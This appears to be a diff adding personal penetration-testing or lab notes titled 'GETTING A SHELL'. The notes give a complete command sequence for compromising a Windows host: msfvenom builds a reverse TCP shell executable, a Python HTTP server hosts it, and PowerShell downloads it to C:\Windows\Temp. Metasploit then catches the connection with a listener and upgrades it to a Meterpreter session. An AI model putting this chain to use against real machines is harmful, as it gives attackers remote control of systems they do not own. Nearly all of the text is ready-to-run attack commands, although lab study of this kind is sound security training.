@@ -1,0 +1,28 @@
+GETTING A SHELL
+    UPLOADING REV SHELL
+        Create the reverse shell file
+            msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.25 LPORT=4444 -f exe -o shell.exe
+        Set up SimpleHTTPServer
+            python -m SimpleHTTPServer
+        Upload the shell, same payload as above but with this as command
+            powershell.exe -command Invoke-WebRequest http://10.10.14.25:8000/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe
+    
+    GETTING THE METERPRETER
+        Get listener ready
+            use exploit/multi/handler
+            set lport 4444
+            set lhost tun0
+            set payload windows/shell/reverse_tcp
+            exploit
+        Execute the shell, same payload as above but with this as command
+            C:\\Windows\\Temp\\shell.exe
+
+    UPGRADING METERPRETER
+        Send current session to background
+            background
+        Get the meterpreter from sessions number (sessions)
+            use post/multi/manage/shell_to_meterpreter
+            set session <NUMBER>
+            exploit
+        Go to meterpreter shell (sessions)
+            sessions -i <NUMBER>
